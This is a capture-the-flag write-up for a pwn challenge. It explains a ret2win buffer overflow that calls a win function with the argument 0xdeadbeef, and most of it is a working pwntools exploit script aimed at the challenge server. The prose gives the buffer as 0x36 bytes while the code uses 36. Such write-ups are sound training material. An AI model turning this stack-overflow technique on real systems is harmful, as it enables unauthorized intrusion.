# args

**Category**: pwn

**Points**: 300

deadbeef!

`nc 195.154.231.70 8767`

## Files

- [chall](./chall)

## Solution

simple ret2win exploit but with an arg. the buffer is 0x36 bytes long, so we need to fill it up, then add the address of the win function, followed up by some padding and the arg which can be found using ghidra.

![ghidra](https://i.imgur.com/TzBDLdq.png)

```python
from pwn import *

binary = context.binary = ELF("./chall", checksec=False)

if args.REMOTE:
    p = remote('195.154.231.70', 8767)
else:
    p = process("./chall")

offset = 36

payload = b"A" * 36 # offset found using gdb
payload += (p32(binary.sym.unreal))
payload += b"CCCC"
payload += (p32(0xdeadbeef))
p.sendline(payload)
resp = p.recvall().decode('utf-8')
log.success("flag: " + resp.replace("args??????\n", "")) # remove extra chars and print flag
```
